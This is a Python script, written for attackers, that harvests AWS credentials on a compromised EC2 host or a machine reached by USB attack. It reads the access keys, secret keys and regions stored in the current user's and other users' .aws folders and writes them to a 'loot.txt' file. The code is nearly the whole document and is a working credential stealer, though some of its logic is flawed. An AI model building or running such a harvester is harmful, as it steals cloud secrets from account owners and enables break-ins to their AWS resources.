# Planning
# Based on the article - https://rhinosecuritylabs.com/aws/aws-iam-credentials-get-compromised/
# Maybe I can make use of this script to first look for local credentials in the default location - The link's Point 4. Local File read



# We could possibly use this script on a Comprmised EC2 or Possibly a target Machine we have Physical Access to (Eg. USB Attack)


import os

profiles = []
access_key = []
secret_key = []
region = []
outFormat = []

outFolder = os.path.realpath(__file__)+"/../"

open(f"{outFolder}loot.txt","w+").write("")

home = os.path.expanduser("~")
currentUser = home.split("\\")[-1]
# Gets the home directory of current user
# since the aws configure stores the credentials on <home>/.aws/credentials


def searchCreds(homeFolder):
# Check if the current Home directory has it
# If have then no need to check other users --> Store and Exit
    if os.path.isfile(f'{homeFolder}/.aws/credentials'):
        # If it exist, then copy out the content
        print (f"Files exist at \"{homeFolder}\\.aws\"... We are copying out the Credentials and Config...")
        # First Copy out the Credentials
        with open(f'{homeFolder}/.aws/credentials') as credentials:
            for line in credentials:
                if "]" in line:
                    # Means its the profile Name used by Admin/User using AWSCLi
                    profiles.append(line.replace("]","").replace("[","").replace("\n",""))
                elif "id" in line:
                    # Means its the Access Key
                    access_key.append(line.split(" = ")[1].replace("\n",""))
                elif "secret" in line:
                    secret_key.append(line.split(" = ")[1].replace("\n",""))
                else:
                    continue
    else:
        print ("File not exist")

    if os.path.isfile(f'{homeFolder}/.aws/config'):
        # Copy out the Config
        with open(f'{homeFolder}/.aws/config') as config:
            for line in config:
                if "region" in line:
                    region.append(line.split(" = ")[1].replace("\n",""))
                elif "output" in line:
                    outFormat.append(line.split(" = ")[1].replace("\n",""))
                else:
                    outFormat.append("None")
    else:
        print ("File not exist")



searchCreds(home)
if profiles:
    # Got Credentials and Config so, pass it into output folder and QUIT
    count = 0
    for profile in profiles:
        open(f"{outFolder}loot.txt","a+").write(f"Credentials for {profile}\n===================================================\n")
        open(f"{outFolder}loot.txt","a+").write(f"Access Key = {access_key[count]}\nSecret Key = {secret_key[count]}\nRegion = {region[count]}\nOutput = {outFormat[count]}\n")
        open(f"{outFolder}loot.txt","a+").write(f"===================================================\n\n")
        count += 1
else:
    usersDir = os.listdir(home + "/../")
    # ['All Users', 'Default', 'Default User', 'desktop.ini', 'Public']
    for user in usersDir:
        if user == 'desktop.ini':
            print ("Next")
        elif user == currentUser:
            continue
        else:
            searchCreds(home+f"/../{user}")
            print (home+f"/../{user}")
